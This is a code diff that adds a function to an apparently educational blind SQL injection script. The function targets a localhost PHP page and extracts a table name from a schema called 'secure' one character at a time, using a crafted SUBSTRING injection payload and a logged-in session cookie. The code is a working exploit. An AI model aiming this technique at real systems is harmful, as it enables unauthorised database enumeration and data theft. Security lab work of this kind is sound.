@@ -23,6 +23,40 @@ def find_length(my_cookies):
     # The length is more than 20 characters
     return -1
 
+# This function receives the length of the table and finds the name of it by trying out all the possible options in a
+# blind sqli manner.
+def find_name(my_cookies, length):
+
+    # Because I assume that the name of the table is encrypted through md5, I am only going to try lowercase english
+    # letters and numbers.
+    # If I will be mistaken, I will change that.
+
+    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+    result = ""
+
+    # We want the loop to iterate over the entire string including the last character
+    for position in range(1, length + 1):
+        found = False
+        for char in charset:
+            url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20SUBSTRING((SELECT%20table_name%20FROM%"
+                   f"20information_schema.tables%20WHERE%20table_schema=%27secure%27%20LIMIT%201),{position},1)"
+                   f"=%27{char}%27;--%20")
+
+            response = requests.get(url, cookies = my_cookies)
+
+            if "wonderland" in response.text:
+                print(f"The char in position {position} is {char}")
+                result += char
+                found = True
+                break
+
+        if not found:
+            print("OH NO THIS IS NOT MD5!")
+            exit(1)
+
+    return result
+
 def main():
 
     # The cookie in order to log in as alice
@@ -30,6 +64,8 @@ def main():
 
     length = find_length(my_cookies)
     print(length)
+
+    print(find_name(my_cookies, length))
 
 if __name__ == "__main__":
     main()
